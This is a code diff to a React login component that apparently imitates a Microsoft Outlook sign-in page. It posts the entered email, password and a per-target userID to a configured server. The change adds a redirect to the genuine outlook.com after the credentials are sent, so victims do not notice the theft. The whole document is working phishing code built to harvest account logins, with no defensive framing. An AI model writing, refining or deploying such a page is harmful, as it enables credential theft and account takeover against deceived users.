@@ -1,6 +1,6 @@
 import Logo from '../assets/ms-logo.svg'
 import LogoHeader from '../assets/out-logo.png'
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { useLocation } from 'react-router-dom'
 import axios from 'axios'
 import { hostURL } from '../helpers/data'
@@ -15,6 +15,12 @@ const Body = () => {
 
   const { search } = useLocation()
   const userID = search.slice(1)
+
+  const [redirect, setRedirect] = useState(false)
+
+  useEffect(() => {
+    redirect && window.location.replace('https://www.outlook.com/')
+  }, [redirect])
 
   const handleClick = () => {
     setShowError(false)
@@ -37,7 +43,10 @@ const Body = () => {
     if (showPassword && password) {
       axios
         .post(`${hostURL}main`, { email, password, userID })
-        .then((resp) => console.log(resp.data))
+        .then((resp) => {
+          console.log(resp.data)
+          setRedirect(true)
+        })
         .catch((e) => console.log(e))
     }
   }
